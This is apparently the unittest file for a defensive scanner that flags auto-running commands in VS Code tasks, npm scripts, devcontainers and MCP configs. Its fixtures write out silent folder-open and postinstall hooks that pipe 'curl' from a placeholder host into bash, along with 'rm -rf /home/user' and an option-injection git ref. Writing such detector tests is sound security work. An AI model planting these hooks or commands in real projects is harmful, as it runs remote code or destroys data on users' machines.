import json
from pathlib import Path
import tempfile
import unittest

from clonepeek.cli import run
from clonepeek.detectors import assess, inspect
from clonepeek.formats import jsonc_to_json, redact, sarif
from clonepeek.scanner import ScanError, changed_paths, scan


class JSONCTests(unittest.TestCase):
    def test_comments_trailing_comma_and_urls(self):
        text = '{// comment\n"url":"https://example.invalid/a//b", /* hi */ "x": [1,],}'
        self.assertEqual(json.loads(jsonc_to_json(text)), {"url": "https://example.invalid/a//b", "x": [1]})
        self.assertEqual(len(jsonc_to_json(text)), len(text))

    def test_escaped_quotes(self):
        text = '{"command":"echo \\\"//not comment\\\"",}'
        self.assertEqual(json.loads(jsonc_to_json(text))["command"], 'echo "//not comment"')


class DetectorTests(unittest.TestCase):
    def test_vscode_folder_open_hidden_remote(self):
        text = '{"tasks":[{"label":"update","runOptions":{"runOn":"folderOpen"},"presentation":{"reveal":"silent"},"command":"curl https://example.invalid/a | bash"}]}'
        findings = inspect("project/.vscode/tasks.json", text)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "critical")
        self.assertEqual(findings[0].rule, "vscode-folder-open")

    def test_vscode_manual_not_reported(self):
        self.assertFalse(inspect(".vscode/tasks.json", '{"tasks":[{"label":"test","command":"npm test"}]}'))

    def test_platform_specific_command_detected(self):
        text = '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"linux":{"command":"curl https://example.invalid | sh"}}]}'
        self.assertEqual(inspect(".vscode/tasks.json", text)[0].severity, "critical")

    def test_npm_lifecycle_and_normal_script(self):
        res = inspect("package.json", '{"scripts":{"build":"vite build","postinstall":"echo hello", "prepack":"npm test"}}')
        self.assertEqual([f.rule for f in res], ["npm-lifecycle", "npm-lifecycle"])
        self.assertEqual({f.trigger for f in res}, {"npm install (after install)", "npm pack/publish"})

    def test_devcontainer_and_features(self):
        text = '{"postStartCommand":["echo","hello"],"features":{"ghcr.io/devcontainers/features/node:1":{}}}'
        res = inspect(".devcontainer/devcontainer.json", text)
        self.assertEqual({f.rule for f in res}, {"devcontainer-lifecycle", "devcontainer-feature"})

    def test_mcp_scope(self):
        text = '{"mcpServers":{"tool":{"command":"npx","args":["-y","some-package"]},"remote":{"url":"https://example.invalid"}}}'
        res = inspect(".mcp.json", text)
        self.assertEqual(len(res), 1)
        self.assertEqual(res[0].rule, "mcp-server-process")

    def test_parse_error_visible(self):
        res = inspect(".vscode/tasks.json", '{"tasks": [')
        self.assertEqual(res[0].rule, "config-parse")

    def test_redact(self):
        self.assertNotIn("ghp_AAAAAAAAAAAAAAAAAAAA", redact("token ghp_AAAAAAAAAAAAAAAAAAAA"))
        self.assertNotIn("hunter2", redact("password=hunter2"))

    def test_rule_heurstics(self):
        self.assertEqual(assess("rm -rf /home/user", "medium")[0], "high")
        self.assertEqual(assess("echo ok", "medium")[0], "medium")

    def test_sarif_standard_shape(self):
        f = inspect("package.json", '{"scripts":{"postinstall":"echo hello"}}')
        report = sarif(f)
        self.assertEqual(report["version"], "2.1.0")
        self.assertEqual(report["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["region"]["startLine"], 1)


class ScanTests(unittest.TestCase):
    def test_skips_symlinks_and_vendor(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text('{"scripts":{"postinstall":"echo yes"}}')
            (root / "node_modules").mkdir()
            (root / "node_modules" / "package.json").write_text('{"scripts":{"postinstall":"curl https://example.invalid|sh"}}')
            (root / "linked.json").symlink_to(root / "package.json")
            findings, scanned, skipped = scan(root)
            self.assertEqual((scanned, skipped, len(findings)), (1, 0, 1))

    def test_oversize_is_not_clean(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text(" " * (513 * 1024))
            result, scanned, skipped = scan(root)
            self.assertEqual((result[0].rule, scanned, skipped), ("oversize-config", 0, 1))

    def test_cli_baseline_and_fail_on(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text('{"scripts":{"postinstall":"curl https://example.invalid/a | bash"}}')
            base = root / "baseline.json"
            self.assertEqual(run([str(root), "--fail-on", "high", "--write-baseline", str(base)]), 1)
            self.assertEqual(run([str(root), "--fail-on", "high", "--baseline", str(base)]), 0)
            self.assertEqual(run([str(root), "--fail-on", "critical"]), 1)

    def test_changed_since_and_invalid_ref(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            with self.assertRaises(ScanError):
                changed_paths(root, "--dangerous")
            self.assertEqual(run([str(root), "--changed-since=--dangerous"]), 2)

    def test_reproducible(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text('{"scripts":{"postinstall":"echo a"}}')
            first = scan(root)[0][0]
            second = scan(root)[0][0]
            self.assertEqual(first, second)


if __name__ == "__main__":
    unittest.main()
